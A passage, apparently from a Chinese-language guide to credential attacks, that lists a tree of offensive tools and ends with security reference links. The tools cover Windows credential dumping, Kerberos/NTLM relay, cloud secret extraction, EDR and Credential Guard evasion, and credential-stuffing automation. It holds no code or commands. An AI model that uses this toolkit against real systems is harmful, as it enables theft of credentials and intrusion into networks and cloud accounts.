├── John the Ripper 1.9.1-jumbo
├── PassGPT-2026 (AI密码生成)
├── PassGAN 2026 (GAN密码生成)
└── PassLLM (LLM密码生成)

[Windows凭据]
├── mimikatz (混淆版)
├── nanodump 2026 (SSP注入)
├── handlekatz 2026 (句柄提取)
├── SharpDPAPI 2026
├── PPLDump 2026 (PPL绕过)
└── PPLKiller 2026 (驱动保护绕过)

[Kerberos/NTLM]
├── impacket 2026
├── Rubeus 2.3+
├── certipy-ad 4.8+ (ADCS攻击)
├── Responder 2026
├── ntlmrelayx 2026
└── Inveigh 2026

[云凭据]
├── AWS IMDSv2 Bypass Toolkit
├── Azure MI Token Extractor
├── GCP SA Key Extractor
├── K8s Secret Stealer
└── Serverless Credential Collector

[检测规避]
├── SysWhispers3 (系统调用)
├── HWBP-ETW-Patch (硬件断点)
├── LLVM Obfuscator
├── Credential Guard Bypass Kit
└── EDR规避框架 (多EDR)

[自动化]
├── NetExec 2026
├── BloodHound CE 6.0
├── CrackMapExec 2026
└── CredMonster 2026 (撞库自动化)
```

### 16.2 2026年新增参考资源

```text
- Hashcat 7.x Release Notes: https://hashcat.net/wiki/
- NVIDIA Grace Hopper HPC: https://www.nvidia.com/en-us/data-center/grace-hopper-superchip/
- NIST PQC FIPS 203/204/205: https://csrc.nist.gov/projects/post-quantum-cryptography
- 2026 OWASP Password Attacks: https://owasp.org/www-project-web-security-testing-guide/
- MITRE ATT&CK Credential Access: https://attack.mitre.org/tactics/TA0006/
- CVE-2026 Kerberos Advisories: https://msrc.microsoft.com/update-guide/
- AWS IMDSv2 Security: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
- Azure Managed Identity Security: https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/
- GCP Service Account Security: https://cloud.google.com/iam/docs/service-accounts
- Kubernetes Secrets Security: https://kubernetes.io/docs/concepts/configuration/secret/
- Windows Credential Guard: https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/
- WebAuthn/FIDO2 Security: https://www.w3.org/TR/webauthn-2/
- FIDO2 CTAP: https://fidoalliance.org/specifications/
```